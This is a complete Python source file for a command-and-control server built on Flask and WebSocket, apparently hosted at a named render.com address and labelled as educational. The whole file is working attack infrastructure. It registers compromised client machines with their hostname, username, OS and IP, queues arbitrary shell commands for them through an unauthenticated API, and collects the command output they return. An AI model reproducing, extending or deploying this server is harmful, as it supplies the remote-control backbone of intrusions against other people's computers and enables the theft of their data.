#!/usr/bin/env python3
"""
C2 SERVER WITH FLASK + WEBSOCKET
Run on: https://c2-server-zz0i.onrender.com
Educational Purposes Only
"""

from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit, disconnect
import hashlib
import time
from datetime import datetime
import json
import threading
import os
from typing import Dict, List

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key-change-in-production')
socketio = SocketIO(app, cors_allowed_origins="*", ping_timeout=60, ping_interval=25)

# Store clients and commands
clients: Dict[str, Dict] = {}
command_queue: Dict[str, List[Dict]] = {}
client_lock = threading.Lock()

def generate_client_id(client_data: dict) -> str:
    """Generate unique client ID"""
    unique = f"{client_data.get('hostname', '')}{client_data.get('os', '')}{client_data.get('username', '')}"
    return hashlib.md5(unique.encode()).hexdigest()[:12]

@app.route('/')
def index():
    """Root endpoint"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Server - Educational Use Only</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            h1 { color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; }
            .status { background: #4CAF50; color: white; padding: 5px 10px; border-radius: 5px; }
            .endpoint { background: #f0f0f0; padding: 10px; margin: 10px 0; border-left: 4px solid #4CAF50; }
            code { background: #eee; padding: 2px 4px; border-radius: 3px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🛰️ C2 Command & Control Server</h1>
            <p><span class="status">ONLINE</span> Educational Purposes Only</p>
            
            <h2>📡 Server Information</h2>
            <div class="endpoint">
                <strong>WebSocket Endpoint:</strong> <code>wss://c2-server-zz0i.onrender.com/socket.io/</code>
                <br><small>For client connections</small>
            </div>
            
            <h2>🔧 API Endpoints</h2>
            <div class="endpoint">
                <strong>GET</strong> <code>/health</code> - Server status
            </div>
            <div class="endpoint">
                <strong>GET</strong> <code>/clients</code> - List all connected clients
            </div>
            <div class="endpoint">
                <strong>POST</strong> <code>/command</code> - Send command to client
                <br><small>JSON: {"client_id": "abc123", "command": "whoami"}</small>
            </div>
            
            <h2>📊 Current Stats</h2>
            <p>Connected Clients: <strong id="clientCount">0</strong></p>
            <p>Server Uptime: <strong id="uptime">0s</strong></p>
            
            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd;">
                <small>⚠️ This server is for educational purposes only. Use only on systems you own.</small>
            </div>
        </div>
        
        <script>
            // Update stats
            function updateStats() {
                fetch('/health')
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('clientCount').textContent = data.clients_online;
                    });
            }
            
            // Initial load and periodic updates
            updateStats();
            setInterval(updateStats, 5000);
        </script>
    </body>
    </html>
    """

@app.route('/health')
def health():
    """Health check endpoint"""
    with client_lock:
        online = sum(1 for c in clients.values() if c.get('online', False))
        return jsonify({
            'status': 'online',
            'clients_total': len(clients),
            'clients_online': online,
            'timestamp': time.time(),
            'server': 'c2-server-zz0i.onrender.com',
            'version': '1.0'
        })

@app.route('/clients')
def get_clients():
    """Get list of all clients"""
    with client_lock:
        clients_list = []
        for client_id, client in clients.items():
            clients_list.append({
                'id': client_id,
                'online': client.get('online', False),
                'hostname': client.get('hostname', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'username': client.get('username', 'Unknown'),
                'ip': client.get('ip', 'Unknown'),
                'last_seen': client.get('last_seen', 0),
                'first_seen': client.get('first_seen', 0),
                'commands_pending': len(command_queue.get(client_id, []))
            })
        return jsonify(clients_list)

@app.route('/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        with client_lock:
            if client_id not in command_queue:
                command_queue[client_id] = []
            
            cmd_id = f"cmd_{int(time.time())}"
            command_queue[client_id].append({
                'id': cmd_id,
                'command': command,
                'timestamp': time.time(),
                'status': 'pending'
            })
            
            # Notify client via WebSocket if connected
            socketio.emit('new_command', {
                'client_id': client_id,
                'command_id': cmd_id
            }, room=client_id)
            
            app.logger.info(f"Command queued for {client_id}: {command[:50]}...")
            
            return jsonify({
                'status': 'queued',
                'command_id': cmd_id,
                'client_id': client_id,
                'queue_position': len(command_queue[client_id])
            })
            
    except Exception as e:
        app.logger.error(f"Command error: {e}")
        return jsonify({'error': str(e)}), 400

@socketio.on('connect')
def handle_connect():
    """Handle new WebSocket connection"""
    client_ip = request.remote_addr
    app.logger.info(f"New connection from {client_ip}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnect"""
    # Find client by socket ID
    client_id = None
    with client_lock:
        for cid, client in list(clients.items()):
            if client.get('sid') == request.sid:
                client_id = cid
                clients[cid]['online'] = False
                clients[cid]['last_seen'] = time.time()
                app.logger.info(f"Client disconnected: {cid}")
                break

@socketio.on('register')
def handle_register(data):
    """Client registers with system info"""
    try:
        client_ip = request.remote_addr
        
        # Generate client ID
        client_id = data.get('id') or generate_client_id(data)
        
        with client_lock:
            # Store client info
            clients[client_id] = {
                'sid': request.sid,
                'hostname': data.get('hostname', 'Unknown'),
                'os': data.get('os', 'Unknown'),
                'username': data.get('username', 'Unknown'),
                'ip': client_ip,
                'last_seen': time.time(),
                'online': True,
                'first_seen': time.time(),
                'data': data
            }
            
            # Join room for this client
            socketio.server.enter_room(request.sid, client_id)
            
            app.logger.info(f"Client registered: {client_id} - {data.get('hostname')}")
            
            # Send welcome
            emit('welcome', {
                'id': client_id,
                'message': 'Registered with C2 server',
                'timestamp': time.time(),
                'server': 'c2-server-zz0i.onrender.com'
            })
            
            # Check for pending commands
            if client_id in command_queue and command_queue[client_id]:
                pending = command_queue[client_id].pop(0)
                emit('command', {
                    'id': pending['id'],
                    'command': pending['command'],
                    'timestamp': pending['timestamp']
                })
                
    except Exception as e:
        app.logger.error(f"Registration error: {e}")
        emit('error', {'message': str(e)})

@socketio.on('heartbeat')
def handle_heartbeat(data):
    """Handle client heartbeat"""
    client_id = data.get('id')
    if client_id and client_id in clients:
        with client_lock:
            clients[client_id]['last_seen'] = time.time()
            clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('command_response')
def handle_command_response(data):
    """Handle command response from client"""
    client_id = data.get('client_id')
    command_id = data.get('command_id')
    output = data.get('output', '')
    
    app.logger.info(f"Command response from {client_id}: {command_id}")
    
    # Log the response (in production, store in database)
    if len(output) > 100:
        app.logger.info(f"Output (first 100 chars): {output[:100]}...")
    else:
        app.logger.info(f"Output: {output}")

@socketio.on('request_command')
def handle_request_command(data):
    """Client requests next command"""
    client_id = data.get('id')
    
    if not client_id:
        return
    
    with client_lock:
        if client_id in command_queue and command_queue[client_id]:
            pending = command_queue[client_id].pop(0)
            emit('command', {
                'id': pending['id'],
                'command': pending['command'],
                'timestamp': pending['timestamp']
            })
        else:
            emit('idle', {'message': 'No commands pending', 'timestamp': time.time()})

def cleanup_stale_clients():
    """Periodically cleanup stale clients"""
    while True:
        time.sleep(300)  # Every 5 minutes
        
        with client_lock:
            current_time = time.time()
            stale = []
            
            for client_id, client in list(clients.items()):
                if current_time - client.get('last_seen', 0) > 600:  # 10 minutes
                    stale.append(client_id)
            
            for client_id in stale:
                if client_id in clients:
                    del clients[client_id]
                if client_id in command_queue:
                    del command_queue[client_id]
                
                app.logger.info(f"Cleaned up stale client: {client_id}")

def print_banner():
    """Print server banner"""
    print("""
    ╔══════════════════════════════════════════════════╗
    ║                C2 SERVER - FLASK                 ║
    ║        https://c2-server-zz0i.onrender.com        ║
    ║          Educational Purposes Only               ║
    ╚══════════════════════════════════════════════════╝
    """)
    print(f"[*] Server starting on port {os.environ.get('PORT', 10000)}")
    print("[*] WebSocket: wss://c2-server-zz0i.onrender.com/socket.io/")
    print("[*] HTTP API: https://c2-server-zz0i.onrender.com")
    print("[*] Type CTRL+C to stop\n")

if __name__ == '__main__':
    print_banner()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_stale_clients, daemon=True)
    cleanup_thread.start()
    
    # Get port from environment (Render provides PORT)
    port = int(os.environ.get('PORT', 10000))
    
    # Run server
    socketio.run(
        app,
        host='0.0.0.0',
        port=port,
        debug=False,
        allow_unsafe_werkzeug=True
    )
